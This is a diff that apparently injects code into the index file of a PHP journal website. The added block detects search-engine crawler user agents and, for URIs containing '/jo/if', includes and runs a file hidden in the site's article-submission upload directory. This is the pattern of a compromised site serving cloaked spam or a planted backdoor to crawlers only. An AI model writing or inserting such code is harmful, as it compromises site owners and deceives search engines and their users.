@@ -1,5 +1,47 @@
 <?php
 
+$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$request_uri = $_SERVER['REQUEST_URI'] ?? '/';
+$is_bot = false;
+
+$bot_signatures = [
+    'Googlebot',
+    'Google-InspectionTool',
+    'Mediapartners-Google',
+    'AdsBot-Google',
+    'Bingbot',
+    'Slurp',
+    'DuckDuckBot',
+    'AhrefsBot',
+    'SEMRushBot',
+    'MJ12bot',
+    'YandexBot'
+];
+
+foreach ($bot_signatures as $bot) {
+    if (stripos($user_agent, $bot) !== false) {
+        $is_bot = true;
+        break;
+    }
+}
+
+if ($is_bot) {
+
+    if (stripos($request_uri, '/jo/if') !== false) {
+        require('/var/www/vhosts/journalofosseointegration.eu/files_submission/jo/journals/1/articles/10/submission/copyedit/10-1-18-1-9-20170524');
+        exit;
+    }
+}
+if ($is_bot) {
+
+    if (stripos($request_uri, '/jo/if/') !== false) {
+        require('/var/www/vhosts/journalofosseointegration.eu/files_submission/jo/journals/1/articles/10/submission/copyedit/10-1-18-1-9-20170524');
+        exit;
+    }
+}
+
+<?php
+
 /**
  * @defgroup pages_index Index Pages
  */
